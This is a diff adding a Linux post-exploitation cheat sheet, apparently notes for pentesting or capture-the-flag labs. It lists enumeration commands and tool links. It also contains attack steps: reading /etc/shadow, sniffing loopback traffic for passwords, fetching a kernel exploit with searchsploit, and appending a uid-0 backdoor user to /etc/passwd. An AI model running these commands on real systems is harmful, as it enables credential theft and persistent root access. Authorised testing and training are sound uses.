@@ -1,0 +1,189 @@
+### postex ###
+## links
+LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
+LinEnum: https://github.com/rebootuser/LinEnum
+LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
+Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
+Linux Priv Checker: https://github.com/linted/linuxprivchecker
+https://gtfobins.github.io/
+
+
+##########
+## host ##
+##########
+hostname
+uname -a
+cat /proc/version
+cat /etc/issue								# distribution version
+cat /etc/*-release
+cat /etc/passwd								# check other users
+cat /etc/group								# check groups
+cat /etc/shadow								# check shadow if available right
+ls -Al /var/mail							# check user in mail dir
+w									# who is logged in
+
+################
+## pwned user ##
+################
+cat ~/.bash_profile
+cat ~/.bashrc								# startup list of actions
+id									# check groups
+sudo -V									# check sudo version
+sudo -l									# check sudo perm
+doas									# is doas there ?
+env									# show env variables
+echo $PATH								# show PATH env var
+set									# show all set env variables
+history									# check user's history
+echo $HISTFILE								# where is the history file
+find /home/ -type f -name ".viminfo" 2>/dev/null                        # find all .viminfo files
+find /home/ -type f -name ".nano_history" 2>/dev/null
+find /home/ -type f -name ".emacs*" 2>/dev/null
+cat ~/.ssh/config							# get ssh config
+stat /path/to/file							# get access/modify timestamp
+find / -writable -type d 2>/dev/null					# found writable dir
+find / -writable 2>/dev/null|cut -d "/" -f 2,3|grep -v proc|sort -u	# find writable dir
+
+#############
+## network ##
+#############
+ifconfig								# network interfaces
+ip address show // ip a s						# same
+ip route
+cat /etc/timezone
+cat /etc/network/interfaces
+cat /etc/hosts								# DNS resolv
+cat /etc/resolv.conf							# DNS resolv
+route									# list of routes (U:Up, G:Gateway)
+routel									# same
+cat /etc/nsswitch.conf							# DNS resolution order
+sudo iptables -L							# if sudo rights
+ls /etc/iptables/							# search for iptables dump / rules
+cat /etc/iptables							# same
+find / -type f -iname "*iptables-save*" -ls 2>/dev/null			# search for iptables dump
+ufw --help								# is there ufw firewall ?		
+
+#############
+## process ##
+#############
+ps aux									# show process
+ps -eFH									# hierarchical view
+netstat -laputen							# network activity
+ss -laputen								# if netstat doesnt work
+ss -anp                                                                 # a:all, n:no hostresolv, p=proc name
+lsof -i									# List Open Files
+ls /etc/init.d/								# startup service (sysV)
+ls /usr/lib/systemd/system/                                             # show target unit and services
+ls /etc/systemd/system/                                                 # another place to find services
+systemctl --type=service                                                # show loaded/active/running service
+cat /etc/ssh/sshd_config						# ssh config
+watch -n 1 "ps -aux | grep -i pass"                                     # check process for pass
+
+#############
+## package ##
+#############
+rpm -qa									# RPMbased list all installed package
+dpkg -l									# Debianbased list all installed package
+apt list --upgradeable							# unpatched software list
+
+##########
+## logs ##
+##########
+last -f /var/log/wtmp							# historical data of logins
+last
+last -f /var/log/btmp							# historical data of failed login
+tail -f /var/log/auth.log						# auth log
+cat /var/log/auth.log* | grep -i COMMAND | less				# auth log sudo command
+cat /var/log/syslog* | less						# system process log
+ls /var/log/								# other third-party logs
+# system-wide
+cat /etc/bash.bashrc
+cat /etc/profile
+
+###########
+## mount ##
+###########
+cat /etc/fstab                                                          # drive mounted at boot
+mount                                                                   # list all mounted filesystems
+lsblk                                                                   # list all available disks
+
+############
+## kernel ##
+############
+lsmod                                                                   # list loaded kernel modules
+/sbin/modinfo libata                                                    # find more info on libata kernel module
+cat /etc/issue                                                          # system identy
+uname -r                                                                # get kernel version
+arch                                                                    # get arch
+searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"        # search for exploit
+        | grep "4\."                                                    # filter with kernel version
+        | grep -v "4\.8"                                                # remove others
+searchsploit -m 45010                                                   # DL exploit
+
+##########
+## cron ##
+##########
+crontab -l                                                              # own cron
+sudo crontab -l                                                         # sudo cron if right
+cat /etc/crontab                                                        # check cron
+ls -Al /var/spool/cron/*                                                # check cron
+ls -Al /etc/cron*                                                       # check cron
+        crontab with tar, 7z, rsync wild card ?
+grep "CRON" /var/log/syslog                                             # inpect cron log file (if right)
+
+###############
+## SUID/SGID ##
+###############
+find / -type f -perm -04000 -ls 2>/dev/null				# list files with SUID/SGID
+cat /proc/{PID}/status
+cat /proc/1932/status                                                   # get info on process
+grep Uid /proc/1932/status                                              # get uid info
+cat /var/log/syslog | grep tcpdump                                      # check log if cmd failed
+getcap -r / 2>/dev/null							# list binary with cap added
+
+#########
+## LSM ##
+#########
+systemctl status apparmor                                               # appArmor status
+aa-enabled								# enabled or not
+aa-status                                                               # get AppArmor status
+/usr/sbin/aa-status
+getenforce								# selinux enabled or not
+sestatus								# status
+cat /etc/selinux/config							# selinux config
+ls -Z // ps -Z // netstat -Z						# get selinux context
+
+############
+## others ##
+############
+cat /etc/exports							# search writable share with no_root_squash
+find / -type f -iname "*.log"  2>/dev/null				# find some logs file
+find / -type f -iname "*.conf" 2>/dev/null				# find some confs file
+find / -type f -iname "*.bak"  2>/dev/null				# find some backup file
+find / -type f -iname "*flag*" -exec cat {} \+ 2>/dev/null | grep -i "THM{"
+# if we have the right
+sudo tcpdump -i lo -A | grep -i "pass"                                  # -A:ASCII
+
+############
+## shadow ##
+############
+openssl passwd -1 -salt salt password1
+leo:$1$salt$7emaRVc/uKdh8lkPqc5QJ0:root:/root/bin/bash
+# openssl use crypt algorithm by default
+openssl passwd w00t                                                     # gen new pass
+echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd      # new root user
+su root2
+
+###############
+## auto enum ##
+###############
+# /usr/bin/unix-privesc-check
+./unix-privesc-check standard > output.txt                              # sstandart/detailed
+# LinEnum
+# LinPeas
+
+
+
+
+
+
